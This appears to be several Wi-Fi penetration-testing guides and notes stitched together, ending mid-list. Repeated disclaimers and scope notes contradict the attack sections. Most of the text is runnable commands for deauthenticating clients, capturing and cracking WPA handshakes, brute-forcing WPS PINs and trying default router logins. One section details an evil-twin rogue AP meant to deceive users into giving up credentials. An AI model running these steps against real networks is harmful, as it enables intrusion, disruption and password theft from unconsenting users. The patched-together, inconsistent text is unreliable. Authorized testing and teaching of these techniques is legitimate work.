```
> ⚠️ **LEGAL DISCLAIMER — READ FIRST**
> It is illegal in most jurisdictions to run any of the steps below against a network you don't own or don't have **explicit, written authorization** to test. This includes your neighbor's Wi-Fi, a coffee shop's network, or your employer's network without a signed scope. Only run this on:
> - Your own home lab network, **or**
> - A network where you have a signed penetration testing agreement / rules of engagement (RoE) document.
>
> This guide is for education and authorized security testing only.



> **This section covers networking configuration for an isolated, authorized test access point. It does not cover credential harvesting, traffic interception, session hijacking, or impersonation of real networks.**


### Lab Safety Requirements

* Use devices that you own or have explicit authorization to test.
* Use a dedicated test SSID.
* Do not reproduce the SSID of a real nearby network.
* Do not use real users' devices as test clients.
* Do not collect credentials, cookies, session tokens, or personal data.
* Prefer an isolated or disposable uplink.
* Record the test scope and authorized devices before beginning.
* Restore the host firewall and networking configuration after testing.
```

# Wireless (802.11) Penetration Testing — Beginner's Walkthrough

> ⚠️ **LEGAL DISCLAIMER — READ FIRST**
> It is illegal in most jurisdictions to run any of the steps below against a network you don't own or don't have **explicit, written authorization** to test. This includes your neighbor's Wi-Fi, a coffee shop's network, or your employer's network without a signed scope. Only run this on:
> - Your own home lab network, **or**
> - A network where you have a signed penetration testing agreement / rules of engagement (RoE) document.
>
> This guide is for education and authorized security testing only.

---

## Before You Start: What You'll Need

| Requirement | Why |
|---|---|
| Linux machine (Kali Linux recommended) | Most tools here (aircrack-ng, reaver) come pre-installed on Kali |
| A wireless adapter that supports **monitor mode** and **packet injection** | Most laptop built-in Wi-Fi cards do NOT support this — you'll likely need a USB adapter (common chipsets: Atheros AR9271, Ralink RT3070) |
| Written authorization / test scope | Legally required — see disclaimer above |
| A target network you're authorized to test | For practice, set up your own router at home |

**Quick check:** run `iw list` and look for `monitor` under "Supported interface modes." If it's not listed, your adapter can't do this.

---

## Glossary (skim this before Phase 1)

- **BSSID** — the MAC address of a specific access point (router radio).
- **ESSID/SSID** — the human-readable network name (e.g., "HomeWiFi").
- **Monitor mode** — a mode where your wireless card captures *all* nearby traffic instead of just traffic addressed to it.
- **Deauthentication ("deauth") frame** — a management frame that forcibly disconnects a client from an AP. Used here to force a reconnection so we can capture data.
- **4-way handshake** — the exchange that happens when a device connects to a WPA/WPA2 network. Capturing it lets you attempt to crack the password offline.
- **WPS** — Wi-Fi Protected Setup, a legacy "push-button" pairing feature with known PIN vulnerabilities.
- **Evil Twin / Rogue AP** — a fake access point broadcasting the same name as a real one, set up to trick devices or users into connecting to it instead of the legitimate network.

---

## Phase 1: Set Up Your Wireless Adapter

**Goal:** switch your adapter from normal ("Managed") mode into "Monitor" mode so it can capture raw wireless traffic.

### Step 1.1 — Find your adapter's name
```bash
iwconfig
```
Look for an entry like `wlan0` or `wlan1`. This is your interface name — you'll use it in every command below. (If you only see `lo` and `eth0`, your Wi-Fi adapter isn't detected — check it's plugged in and supported.)

### Step 1.2 — Free up the adapter
Your OS's network manager will keep trying to reconnect the card to Wi-Fi, which interferes with monitor mode. Stop it:
```bash
sudo airmon-ng check kill
```
*This is safe — it only pauses background network processes and won't uninstall anything. You'll restart networking normally in Phase 6.*

### Step 1.3 — Turn on monitor mode
```bash
sudo airmon-ng start wlan0
```
✅ **Check it worked:** run `iwconfig` again. Your interface should now be renamed (often to `wlan0mon`) and show `Mode:Monitor`. **Use this new name in every command from here on.**

**Common issue:** if the interface name doesn't change, try `sudo airmon-ng start wlan0` again, or check `dmesg | tail` for driver errors.

---

## Phase 2: Find Your Target Network

**Goal:** see what networks and devices are nearby, then focus on your one authorized target.

### Step 2.1 — Scan everything nearby
```bash
sudo airodump-ng wlan0mon
```
You'll see a live-updating table. Here's how to read it:

| Column | Meaning |
|---|---|
| BSSID | The router's MAC address |
| PWR | Signal strength — closer to 0 is *stronger* (e.g. -40 is a stronger signal than -80) |
| CH | The Wi-Fi channel it's broadcasting on |
| ESSID | The network name — shows `<length: 0>` if the network is hiding its name |

Find your target in this list and note its **BSSID** and **channel**. Press `Ctrl+C` to stop.

### Step 2.2 — Lock onto your target and start recording
```bash
sudo airodump-ng --bssid 00:11:22:33:44:55 --channel 6 -w target_capture wlan0mon
```
- Replace `00:11:22:33:44:55` with your target's BSSID and `6` with its channel.
- `-w target_capture` saves everything to files starting with `target_capture` (e.g. `target_capture-01.cap`) in your current folder.
- **Leave this running in its own terminal window** — you'll need it active for the next phases.

---

## Phase 3: Revealing Hidden Networks (Optional)

Some networks hide their name from the normal broadcast. Here's how to unmask one — **only if it's in your authorized scope.**

### Step 3.1 — Open a *second* terminal
(Keep the Phase 2 `airodump-ng` window running in the background — don't close it.)

### Step 3.2 — Force a connected device to reconnect
```bash
sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```
- `-a` = the AP's BSSID (from Phase 2)
- `-c` = the MAC address of a client device you saw connected to it in the airodump-ng "STATION" list
- `--deauth 5` sends 5 disconnect frames — start small; you can increase if the client doesn't reconnect

**What happens:** the targeted device gets briefly disconnected and automatically reconnects. When it does, it broadcasts the real network name — watch your **first terminal** (the airodump-ng one) and the `<length: 0>` should be replaced with the real ESSID.

> 💡 A broadcast deauth (leaving off `-c`) disconnects *every* client on the network, not just one. Avoid this — it's noisier, more disruptive, and rarely necessary or in-scope.

### Step 3.3 — (Optional) Analyze probe requests
Devices searching for networks they've connected to before "call out" the names of those networks. You can review these later in Wireshark:
```bash
wireshark target_capture-01.cap
```
Filter box: type `wlan.fc.type_subtype == 0x04` and press Enter to show only these probe requests.

---

## Phase 4: Attempting Access

Choose **one** of the two paths below depending on what the network supports.

### Path A — WPA/WPA2 Handshake Capture

**Goal:** capture the "4-way handshake" that happens when a device connects, then try to crack the password from it *offline* (no more contact with the target network needed after this).

1. Make sure your Phase 2 `airodump-ng` capture is still running on the target.
2. Trigger a quick reconnect so the handshake happens while you're recording:
   ```bash
   sudo aireplay-ng --deauth 2 -a 00:11:22:33:44:55 wlan0mon
   ```
3. Watch the **top-right corner** of the airodump-ng window for the message:
   `WPA handshake: 00:11:22:33:44:55`
   This confirms you captured it. If you don't see it after a minute, repeat step 2.
4. Attempt to crack the password offline using a wordlist (a text file of candidate passwords):
   ```bash
   sudo aircrack-ng -w /path/to/wordlist.txt target_capture-01.cap
   ```
   **Beginner note:** this only works if the real password is *in* your wordlist. A strong, random password will not be crackable this way in any reasonable time — that's the whole point of the test (to confirm the password is strong).

### Path B — WPS PIN Attack (only if WPS is enabled)

WPS is an older convenience feature with known weaknesses. Many modern routers disable it or rate-limit attempts.

1. Check which nearby networks have WPS turned on:
   ```bash
   sudo wash -i wlan0mon
   ```
2. Attempt the PIN brute-force against your authorized target:
   ```bash
   sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv
   ```
   **Heads up for beginners:** this can take hours, and most modern routers lock out after repeated failed attempts. If it stalls or errors immediately, WPS is likely already protected — that's a valid, reportable finding on its own.

### Path C — Evil Twin / Rogue AP Attack

**Goal:** instead of attacking the router directly, set up a fake access point with the same name as the target network and trick a user into connecting to it. This tests whether *people*, not just the router's encryption, are a weak point — a very common real-world finding.

**How it works:** you broadcast a clone of the target's SSID, usually paired with a stronger signal or a deauth attack that kicks users off the real AP. Devices that auto-reconnect to "known" network names may connect to your fake AP instead, letting you capture credentials or traffic.

> ⚠️ This is one of the more disruptive and legally sensitive techniques in this guide. It directly affects real users' devices and can capture data belonging to people who never explicitly consented, even if the network owner did. Confirm this is explicitly named in your written scope/RoE before running it — "wireless testing authorized" does not automatically cover impersonating the network to its users.

1. **Set up a second wireless interface (or a second adapter)** to host the fake AP while your first one keeps monitoring/deauthing. If you only have one adapter, you can still do this sequentially, but two makes it far smoother.

2. **Create the rogue AP with the target's SSID:**
   ```bash
   sudo airbase-ng -e "TargetNetworkName" -c 6 wlan0mon
   ```
   - `-e` sets the broadcast network name — match it exactly to the real target.
   - `-c` sets the channel.
   - This creates a new virtual interface, usually `at0`, that acts like a router's Wi-Fi radio.

3. **Give your fake AP a working network so victims don't notice anything wrong:**
   ```bash
   sudo ifconfig at0 up
   sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0
   sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
   ```
   Then configure `dnsmasq` (or similar) to hand out IP addresses via DHCP, so connecting devices get real internet-like connectivity and don't immediately notice something's wrong.

4. **Push existing clients off the real network so they look for a network to reconnect to:**
   ```bash
   sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon
   ```
   `--deauth 0` sends continuous deauth frames rather than a fixed count — devices bumped off the real AP may auto-connect to your identically-named fake one instead.

5. **Capture what you're testing for.** Depending on your authorized scope, this is typically one of:
   - A **captive portal** login page cloned to look like the router's usual login, to see if users will type in the real Wi-Fi password when prompted (tools like `wifiphisher` automate this end-to-end).
   - Passive traffic capture on `at0` with `airodump-ng` or Wireshark, to see what unencrypted traffic flows through your fake AP.

   **Beginner note:** building a convincing captive portal, DNS spoofing, and SSL stripping are each deep topics on their own — start by just confirming devices *will* auto-connect to your rogue AP before building out the credential-capture piece.

6. **Tear down the rogue AP when done:**
   ```bash
   sudo pkill airbase-ng
   sudo ifconfig at0 down
   ```

**What to report:** whether devices auto-connected to the fake network, whether users entered credentials into a fake portal, and recommend user awareness training plus disabling auto-reconnect to open/known SSIDs where possible (this is a client-device and user-behavior weakness, not something the router itself can fully prevent).

---

## Phase 5: Checking for Default Admin Credentials

Once connected to the network (using a password recovered above, or one provided in scope), check whether the router's admin panel still uses factory-default login details — a very common real-world weakness.

1. Turn off monitor mode and restore normal networking:
   ```bash
   sudo airmon-ng stop wlan0mon
   sudo systemctl start NetworkManager
   ```
2. Find the router's address:
   ```bash
   ip route show | grep default
   ```
   You'll see something like `default via 192.168.1.1 dev wlan0` — `192.168.1.1` is your router's admin page address.
3. Open `http://192.168.1.1` in a browser and try common factory defaults:

   | Username | Password |
   |---|---|
   | admin | admin |
   | admin | password |
   | root | admin |
   | admin | *(blank)* |

   **Note:** many newer routers ship with a unique random password printed on a sticker on the device, in which case these generic defaults won't apply — that's actually a good sign for the network's security.

---

## Phase 6: Cleanup (Always Do This Last)

Whether the test succeeded or not, restore your machine to its normal state:
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```
This turns your adapter back to normal mode and lets your OS manage Wi-Fi connections again.

**Before you finish, also:**
- Securely store or delete your `.cap` files and any recovered credentials according to your engagement's data-handling rules.
- Write up your findings (what was tested, what worked, what didn't, and remediation suggestions) for your report.

---

## Troubleshooting Quick Reference

| Problem | Likely Fix |
|---|---|
| `airmon-ng start wlan0` doesn't rename the interface | Your card may already be in monitor mode — check with `iwconfig`; or the driver doesn't support it (try a different adapter) |
| No handshake captured after several deauth attempts | Try a higher `--deauth` count, confirm you're on the correct channel, or move closer to the target |
| `reaver` immediately fails or times out | WPS may be locked out or disabled — this is a normal/expected outcome, not a tool error |
| Can't reach `192.168.1.1` after reconnecting | Confirm you're actually connected to the target network (`iwconfig` or `nmcli`) and double-check the gateway IP from Phase 5, step 2 |
| Devices won't connect to the rogue AP (`airbase-ng`) | Make sure the SSID matches exactly (case-sensitive), your fake AP's signal is comparable or stronger, and the continuous deauth (`--deauth 0`) is still running against the real AP |

---
---
---
---
---
# Wireless (802.11) Penetration Testing — Beginner's Walkthrough
### Rogue Access Point: Monitor Mode Setup Through DHCP/NAT Teardown

> ⚠️ **LEGAL DISCLAIMER — READ FIRST**
> It is illegal in most jurisdictions to run any of the steps below against a network you don't own or don't have **explicit, written authorization** to test. This includes your neighbor's Wi-Fi, a coffee shop's network, or your employer's network without a signed scope. Only run this on:
> - Your own home lab network, **or**
> - A network where you have a signed penetration testing agreement / rules of engagement (RoE) document.
>
> This guide is for education and authorized security testing only.

> **Scope note:** This guide covers monitor-mode setup, creating a rogue access point interface, and the DHCP/NAT plumbing that gives clients on that AP connectivity. It does **not** cover credential harvesting, traffic interception, session hijacking, captive portals, or impersonating a specific real network's SSID/BSSID. Those are separate, higher-risk modules that require additional scoping and explicit authorization — do not extend this guide into them without a written RoE that covers it.

---

## Lab Safety Requirements

Read this before touching a single command.

* Use devices that you own or have explicit authorization to test.
* Use a dedicated test SSID that clearly does not resemble any real nearby network name.
* Do not reproduce the SSID or BSSID of a real nearby network.
* Do not use real users' devices as test clients — use a spare phone/laptop/VM you control.
* Do not collect credentials, cookies, session tokens, or personal data from anything that connects.
* Prefer an isolated or disposable uplink (a mobile hotspot or lab-only router), not your home/production internet connection, so a mistake doesn't leak onto a network you don't intend to affect.
* **Mind your RF footprint.** A rogue AP transmits over the air, not just on your machine — it can be seen and can associate with devices in the surrounding physical space even if you didn't intend that. If you're not in a shielded room, lower your Wi-Fi adapter's TX power and run tests during hours where accidental exposure to neighboring devices is minimized.
* Record the test scope and authorized devices (MAC addresses) before beginning.
* Restore the host firewall and networking configuration after testing (see Step 6).

---

## Prerequisites & Network Layout

**Hardware:**
* A Wi-Fi adapter that supports **monitor mode** and **packet injection**. Not all adapters do this — built-in laptop Wi-Fi chips usually don't. Common chipsets known to work well with the aircrack-ng suite: Atheros AR9271, Ralink RT3070, or newer Realtek RTL8812AU (with the correct driver installed).
* A second network connection for internet uplink (e.g., Ethernet, a second Wi-Fi adapter, or USB tethering) — this stays separate from the adapter you put into monitor mode.

**Software:**
* Kali Linux (this guide assumes Kali; commands and package names may differ slightly on other distros).
* `aircrack-ng` suite (`airmon-ng`, `airbase-ng`) — installed by default on Kali.
* `dnsmasq` — install with `sudo apt install dnsmasq` if not already present.

**Check your adapter supports monitor mode before starting:**
```bash
iw list | grep -A 10 "Supported interface modes"
```
Look for `monitor` in the output. If it's not listed, your adapter's chipset doesn't support it and none of the steps below will work — this is a hardware limitation, not something you fix in software.

**Network layout for this exercise:**
```
[Internet] -- (uplink, e.g. eth0) -- [Your Kali machine] -- (at0, monitor-mode adapter) -- [Test client device]
                                        10.0.0.1 (rogue AP gateway)      10.0.0.10-100 (DHCP pool)
```

---

## Step 1: Identify and Prepare Your Wireless Adapter

Find the name of your Wi-Fi adapter:
```bash
iwconfig
```
You'll see something like `wlan0` or `wlan1`. Take note of this name — this is the adapter that will become your rogue AP. Do **not** confuse it with your uplink interface (e.g., `eth0`); they must be different physical adapters.

Kill processes that commonly interfere with monitor mode (NetworkManager, wpa_supplicant) before switching modes:
```bash
sudo airmon-ng check kill
```
This will disconnect you from any Wi-Fi network you're currently on with that adapter — expected and fine, since you're about to repurpose it.

---

## Step 2: Enable Monitor Mode

```bash
sudo airmon-ng start wlan0
```
Replace `wlan0` with your actual adapter name from Step 1. This creates a new monitor-mode interface, typically named `wlan0mon`. Confirm it exists:
```bash
iwconfig
```
You should see `wlan0mon` listed with `Mode:Monitor`.

**Troubleshooting:** If no new interface appears, run `sudo airmon-ng` alone to list detected wireless adapters, and confirm your adapter is recognized. If it isn't listed at all, the driver may not support monitor mode.

---

## Step 3: Launch the Rogue Access Point with `airbase-ng`

```bash
sudo airbase-ng -e "TEST-LAB-AP" -c 6 wlan0mon
```
* `-e "TEST-LAB-AP"` — the SSID clients will see. **Use an obviously test-labeled name, not one resembling a real network.**
* `-c 6` — the Wi-Fi channel to broadcast on (channel 6 is a common default for 2.4GHz).
* `wlan0mon` — the monitor-mode interface from Step 2.

Leave this running in its own terminal window — it needs to stay active for the AP to keep broadcasting. `airbase-ng` will create a new virtual interface named **`at0`**; this is the interface the rest of this guide (Steps 4–7) configures.

**Troubleshooting:** If `airbase-ng` exits immediately or throws a device-busy error, another process may still be holding the interface — re-run `sudo airmon-ng check kill` in a separate terminal, then retry.

---

## Step 4: Configure the Rogue Interface's IP Address

In a **new terminal** (keep the `airbase-ng` terminal from Step 3 running), assign an IP address and subnet to `at0`:
```bash
sudo ip addr add 10.0.0.1/24 dev at0
sudo ip link set at0 up
```
Confirm it took effect:
```bash
ip addr show at0
```
You should see `10.0.0.1/24` listed as `inet` for `at0`.

*(If your system only has the older `ifconfig` tool, the equivalent is `sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0 up` — but prefer `ip` above, since `ifconfig` is deprecated on current Kali.)*

---

## Step 5: Create the `dnsmasq` Configuration (DHCP + DNS)

Create a config file named `dnsmasq.conf` in your working directory:
```bash
cat << EOF > dnsmasq.conf
# Bind to the rogue AP interface only — never remove this line,
# or dnsmasq may try to serve DHCP on your other network interfaces too.
interface=at0
bind-interfaces
dhcp-authoritative

# DHCP Range: hand out 10.0.0.10 through 10.0.0.100, 12-hour lease
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h

# Gateway handed to clients (points back to the rogue interface)
dhcp-option=3,10.0.0.1

# DNS servers handed to clients
dhcp-option=6,8.8.8.8,8.8.4.4

# Don't read /etc/resolv.conf for upstream DNS — avoids leaking your host's config
no-resolv

# Log every DHCP transaction to the terminal, useful while learning/debugging
log-dhcp
EOF
```

**Common beginner blocker:** on Kali (and most modern distros), `systemd-resolved` may already be bound to port 53, which causes `dnsmasq` to fail to start with a "address already in use" error. Check for this first:
```bash
sudo ss -tulpn | grep :53
```
If something is listed, temporarily stop it before launching dnsmasq:
```bash
sudo systemctl stop systemd-resolved
```
(Remember to restart it during teardown in Step 7, or your host's own DNS resolution will break: `sudo systemctl start systemd-resolved`.)

---

## Step 6: Enable IP Forwarding & NAT

This is what lets a client connected to your rogue AP actually reach the internet through your uplink adapter.

```bash
# Set this to your ACTUAL internet-facing adapter name (from Step 1's iwconfig/ip a output) — NOT wlan0mon or at0.
UPLINK_IFACE=eth0

# Enable IPv4 packet forwarding in the kernel
sudo sysctl -w net.ipv4.ip_forward=1

# Add the NAT rule: traffic from clients gets "masqueraded" as coming from your uplink IP
sudo iptables --table nat --append POSTROUTING --out-interface "$UPLINK_IFACE" -j MASQUERADE

# Allow forwarded traffic from the rogue interface through
sudo iptables --append FORWARD --in-interface at0 -j ACCEPT
```

> ⚠️ Avoid running a blanket `iptables -F` / `iptables -t nat -F` before this on a machine with existing firewall rules you care about — it wipes **all** rules on the host, not just ones related to this test. If you do want a clean slate, back up your current rules first with `sudo iptables-save > ~/pre-test-iptables-backup.rules`.

---

## Step 7: Launch `dnsmasq`

```bash
sudo dnsmasq -C dnsmasq.conf -d
```
The `-d` flag runs it in the foreground so you can watch DHCP activity live. When your authorized test client connects to the `TEST-LAB-AP` SSID, you'll see output like:
```text
dnsmasq-dhcp: DHCPREQUEST(at0) 10.0.0.15 aa:bb:cc:dd:ee:ff
dnsmasq-dhcp: DHCPACK(at0) 10.0.0.15 aa:bb:cc:dd:ee:ff test-device
```
That confirms the client received an IP lease and should now have connectivity through your rogue AP.

**For your test record/report**, capture: the client MAC address, the leased IP, and a timestamp — this is standard evidence to include in a pentest report for anything that associated with the AP during the authorized window.

---

## Step 8: Teardown (Do This Every Time, Even If the Test Was Cut Short)

Order matters — reverse the steps you took:

```bash
# 1. Stop dnsmasq (Ctrl+C in its terminal, or:)
sudo killall dnsmasq

# 2. Remove the NAT and forwarding rules you added in Step 6
sudo iptables --table nat --delete POSTROUTING --out-interface "$UPLINK_IFACE" -j MASQUERADE
sudo iptables --delete FORWARD --in-interface at0 -j ACCEPT

# 3. Disable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=0

# 4. Remove the IP address and bring at0 down
sudo ip addr flush dev at0
sudo ip link set at0 down

# 5. Stop airbase-ng (Ctrl+C in its terminal from Step 3)

# 6. Take the adapter out of monitor mode and restore normal Wi-Fi
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager

# 7. If you stopped systemd-resolved in Step 5, restart it
sudo systemctl start systemd-resolved
```

Confirm you're back to a clean state:
```bash
ip addr        # at0 and wlan0mon should no longer appear
iptables -t nat -L -n     # your MASQUERADE rule should be gone
```

---

## Quick Troubleshooting Reference

| Symptom | Likely cause |
|---|---|
| `airmon-ng start` produces no `mon` interface | Adapter chipset doesn't support monitor mode |
| `airbase-ng` exits immediately | Interface still held by NetworkManager/wpa_supplicant — rerun `airmon-ng check kill` |
| `dnsmasq` fails with "address already in use" | `systemd-resolved` bound to port 53 — stop it first |
| Client connects but gets no IP | Check `dnsmasq` is actually running and bound to `at0`; check `at0` has `10.0.0.1/24` assigned |
| Client gets IP but no internet | Check `UPLINK_IFACE` is correct and actually has internet access; check `ip_forward` is `1` |
| Host loses its own DNS after testing | You forgot to restart `systemd-resolved` in teardown |

---
---
---
---
---
---

While you missed the live action, the agenda covered core **802.11 wireless penetration testing fundamentals**—specifically moving beyond the outdated myth that modern Wi-Fi encryption has rendered wireless attacks obsolete.

Here is a breakdown of the key concepts, technical setups, and attack methodologies covered during the session:

---

### **1. Hardware & Environment Setup**

Before executing any wireless attacks, standard Network Interface Cards (NICs) must be configured for deep packet inspection.

* **Monitor Mode vs. Managed Mode:** Standard Wi-Fi cards operate in *Managed Mode* (only processing packets intended for their specific MAC address). Attacks require forcing the wireless adapter into *Monitor Mode* (promiscuous mode for 802.11) to intercept all ambient radio traffic across a target channel without associating with an Access Point (AP).
* **Common Tooling:** Command-line suite setup using `airmon-ng start wlan0` or `iwconfig`.

---

### **2. Wireless Reconnaissance & Traffic Analysis**

The session demonstrated how attackers map out target wireless networks passively and actively.

* **Finding AP Channels & Client MACs:** Using tools like `airodump-ng` or `Kismet` to sweep 2.4 GHz and 5 GHz frequency spectrums, identifying targeted BSSIDs (AP MAC addresses), operational channels, signal strength (RSSI), and connected client station MAC addresses.
* **Analyzing Probe Requests:** Mobile devices constantly broadcast "Probe Requests" searching for previously saved SSIDs. Intercepting these unencrypted broadcast frames exposes a device’s network history, revealing potential targets for rogue access point attacks.

---

### **3. Unmasking Hidden ESSIDs**

Disabling SSID broadcasting is often used as security through obscurity, but it does not stop packet capture.

* **The Technique:** Access Points hiding their ESSID still include the network name in specific management frames (such as `Reassociation Request` or `Probe Response` frames when a legitimate client connects).
* **Exploitation:** Attackers force a client to reconnect—often using targeted deauthentication frames (`aireplay-ng --deauth`)—capturing the cleartext ESSID from the reconnecting client’s response frame.

---

### **4. Router Credentials & Misconfiguration Exploitation**

The workshop concluded with exploiting administrative weaknesses once network access or proximity is established.

* **Default Credentials:** Exploiting factory-default admin logins (e.g., `admin:admin`, `admin:password`) on router web management interfaces due to unchanged vendor settings.
* **WPS & Legacy Vulnerabilities:** Scanning for enabled Wi-Fi Protected Setup (WPS) PIN vulnerabilities using tools like `Reaver` or `Bully` to bypass complex WPA/WPA2 passphrases entirely.

---
---
---
Here is the complete step-by-step workflow for executing a standard 802.11 wireless penetration testing assessment based on the webinar's agenda.

> **Legal Disclaimer:** Performing wireless attacks on networks without explicit, written authorization from the owner is illegal. This guide is strictly for educational and authorized penetration testing purposes.

---

### Phase 1: Wireless Adapter & Environment Setup

Before capturing raw 802.11 frames, you must identify your interface and switch it from Managed Mode to Monitor Mode.

1. **Identify your wireless network card:**
```bash
ip link show
# or
iwconfig

```

*Note your wireless interface name (e.g., `wlan0` or `wlan0mon`).*
2. **Kill interfering network processes:**
Network managers automatically try to re-assign your card to Managed Mode. Kill these background tasks:
```bash
sudo airmon-ng check kill

```

3. **Enable Monitor Mode:**
```bash
sudo airmon-ng start wlan0

```

*Verify the interface name changes (typically to `wlan0mon`). Confirm by running `iwconfig` and verifying `Mode:Monitor`.*

---

### Phase 2: Reconnaissance & Target Identification

1. **Perform a broad spectrum scan:**
Listen across all active channels (2.4 GHz and/or 5 GHz) to discover visible and hidden Access Points (APs) along with connected stations (clients):
```bash
sudo airodump-ng wlan0mon

```

*Observe the output list:*
* **BSSID:** MAC address of the Access Point.
* **PWR:** Signal strength (closer to 0 is stronger, e.g., -40 dBm is stronger than -80 dBm).
* **CH:** Operating channel.
* **ESSID:** Network name (if hidden, it appears as `<length: 0>`).

2. **Target a specific AP and channel:**
Lock your card onto the target AP's channel and record captured packets to a file for analysis:
```bash
sudo airodump-ng --bssid 00:11:22:33:44:55 --channel 6 -w target_capture wlan0mon

```

---

### Phase 3: Unmasking Hidden ESSIDs & Probe Request Analysis

#### Unmasking a Hidden ESSID

A hidden network omits its name from standard beacon frames. To reveal it, force a connected client to re-associate so its device sends the ESSID in cleartext.

1. **Open a new terminal while `airodump-ng` is actively capturing on the targeted channel.**
2. **Send targeted deauthentication frames to a connected client station:**
```bash
sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

```

* `-a`: Target AP BSSID
* `-c`: Target Client MAC address

3. **Observe your `airodump-ng` window:** As the client automatically reconnects, the hidden `<length: 0>` ESSID populates with the actual cleartext network name.

#### Analyzing Client Probe Requests

1. Review the bottom section of your `airodump-ng` screen under **Probes**.
2. Note SSIDs broadcasted by unassociated client devices searching for previously saved networks. These can be logged or analyzed using Wireshark:
```bash
wireshark target_capture-01.cap

```

*Filter expression:* `wlan.fc.type_subtype == 0x04` (Probe Requests).

---

### Phase 4: Exploitation & Gaining Access

Once you have identified the target, you can proceed with exploitation using either credential recovery or configuration flaws.

#### Option A: WPA/WPA2 Handshake Capture & Cracking

1. Keep `airodump-ng` running on the target BSSID and channel.
2. Issue a brief deauthentication frame to capture the 4-Way Handshake upon client re-connection:
```bash
sudo aireplay-ng --deauth 2 -a 00:11:22:33:44:55 wlan0mon

```

3. Check the top-right corner of your `airodump-ng` terminal for the confirmation banner: `WPA handshake: 00:11:22:33:44:55`.
4. Crack the captured handshake offline using `aircrack-ng` or `hashcat`:
```bash
sudo aircrack-ng -w /path/to/wordlist.txt target_capture-01.cap

```

#### Option B: WPS Vulnerability Exploitation (If WPS is Enabled)

If the router uses legacy Wi-Fi Protected Setup (WPS):

1. Scan for WPS-enabled targets:
```bash
sudo wash -i wlan0mon

```

2. Run an online brute-force attack against the 8-digit WPS PIN:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv

```

---

### Phase 5: Post-Exploitation & Default Credential Exploitation

1. **Stop Monitor Mode and Connect:**
Return your interface to standard mode and connect to the network using the recovered PSK:
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager

```

2. **Locate the Default Gateway (Router IP):**
```bash
ip route show | grep default
# Example output: default via 192.168.1.1 dev wlan0

```

3. **Test Default Administrative Credentials:**
Access the web interface at `[http://192.168.1.1](http://192.168.1.1)` in a browser or command line, testing common vendor-default credentials:
* `admin` : `admin`
* `admin` : `password`
* `root` : `admin`
* `admin` : *[blank]*

---

### Phase 6: Post-Assessment Cleanup

Always restore your network configuration to its default state after testing:

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager

```

---
---
---

# **Complete Wi-Fi Attack Overview for Beginners (Ethical Hacking Class Notes)**

In cybersecurity, ethical hackers try to discover weaknesses in Wi-Fi networks so they can advise companies on how to secure them.
All Wi-Fi password-stealing techniques fall into **three major categories**:

1. **Social Engineering / Phishing** (tricking the user)
2. **Protocol Exploitation** (taking advantage of weaknesses in Wi-Fi systems)
3. **Direct Cracking** (using computing power to break password hashes)

This document explains each method in simple, clear language with examples.

---

# 🔵 **1. Social Engineering & Phishing Attacks**

These attacks rely on **human mistakes**, not technical flaws.
The attacker tricks the user into **giving the password themselves**.

---

## **1. Evil Twin Attack (Rogue Access Point)**

**Concept:** The attacker creates a fake Wi-Fi hotspot that looks like the real one.

**How it works:**

1. The attacker sets up a fake Wi-Fi network with the **same name (SSID)** as a nearby legitimate network.

   * Example: “Starbucks Wi-Fi”
2. The fake Wi-Fi often has a **stronger signal**, so devices prefer it.
3. To push users away from the real Wi-Fi, the attacker may use a **Deauthentication Attack** (disconnecting people from the real network).
4. When the victim reconnects, they connect to the fake Wi-Fi (the “Evil Twin”).

**How the password is stolen:**
The attacker shows the user a **fake login page** (captive portal) that says:

* “Your session has expired. Enter the Wi-Fi password to continue.”
* “Security upgrade required. Please re-enter password.”

Whatever password the user types goes straight to the attacker.

**Why this works:**
Most users do not question login pages. They assume it’s normal.

---

## **2. Captive Portal Phishing**

This is usually part of an Evil Twin attack.

**What happens:**
After the user connects to the fake Wi-Fi, they are automatically redirected to a page that:

* looks professional,
* uses the café/hotel logo,
* claims to need the Wi-Fi password.

**The user voluntarily submits the password**, thinking it's part of the Wi-Fi procedure.

---

# 🟠 **2. Protocol Exploitation Attacks**

These attacks take advantage of weaknesses or design flaws in the **technology** of Wi-Fi.

---

## **3. WPS (Wi-Fi Protected Setup) Brute-Force Attack**

WPS was designed to make connecting easy using a button or an 8-digit PIN.
However, **older routers** have a major design flaw.

### **Understanding the flaw:**

* The 8-digit PIN is checked in **two halves**:

  * First 4 digits
  * Last 3 digits (the 8th is just a checksum)
* The router tells the attacker when the **first half is correct**, so the attacker only brute-forces 10,000 + 1,000 = **11,000 combinations**.

**Outcome:**
Once the correct PIN is found, the router reveals:

* the **actual Wi-Fi password (WPA/WPA2 PSK)**
  even if the password is long and complex.

**Why this matters:**
A very strong Wi-Fi password becomes useless if WPS is enabled.

---

## **4. PMKID Attack**

This attack targets modern WPA2/WPA3 networks.

### **What is PMKID?**

PMKID = **Pairwise Master Key Identifier**
It is a small piece of data used during Wi-Fi authentication.

### **Why PMKID helps attackers:**

Some routers include a PMKID hash in the **first message** of the connection process.

**This means:**
The attacker can request a PMKID **without needing a client**, without a handshake, and without deauthentication.

### **How the attack works:**

1. The attacker requests PMKID data from the router.
2. The router sends back a hash (a scrambled version of the password-derived key).
3. The attacker takes this PMKID hash **offline** and runs:

   * dictionary attacks
   * brute-force attacks
   * GPU-powered cracking

**Why it’s powerful:**
It only requires **one packet** and works even when nobody is connected.

---

# 🔴 **3. Direct Cracking Attacks (Offline Attacks)**

Here, the attacker already has a password hash (handshake or PMKID) and tries to break it using computing power.

---

## **5. Dictionary Attacks**

The attacker uses a **wordlist** of likely passwords:

* “12345678”
* “password2024”
* “kenya12345”
* “family names”
* “phone numbers”

The system checks each entry against the hash.

**Success rate depends on:**

* Password strength
